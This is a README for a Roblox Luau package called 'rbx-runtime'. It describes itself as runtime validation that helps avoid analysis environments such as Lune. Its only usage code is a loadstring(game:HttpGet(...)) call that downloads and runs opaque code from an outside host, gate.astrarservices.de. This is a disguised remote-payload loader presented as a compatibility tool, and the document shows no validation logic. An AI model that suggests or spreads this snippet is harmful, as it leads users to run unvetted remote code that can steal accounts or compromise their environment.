# rbx-runtime
Lightweight Luau runtime validation layer for Roblox compatibility. Verifies proper in-game context and helps reduce external runtime logging or unsupported analysis environments such as Lune.

## Usage

```lua
if not game:IsLoaded() then
    game.Loaded:Wait()
end

local success, err = pcall(function()
    loadstring(game:HttpGet("https://gate.astrarservices.de/v2/files/495fcbbf59b543aca6d6798080883a3a"))()
end)

if success then
    -- Everything is good
else
    warn("Loadstring failed:", err)
    warn("AstrarServices: Does your environment support load/loadstring?")
end
```

## Features

* Runtime environment checks
* Roblox compatibility validation

## Files

* `main.luau` — Runtime validation logic
* `README.md` — Documentation

## Requirements

* Roblox-compatible environment
* HTTP requests enabled
* `loadstring` & `load` support

* ### This was developed by @vyxonq for FAQ DM me thx!
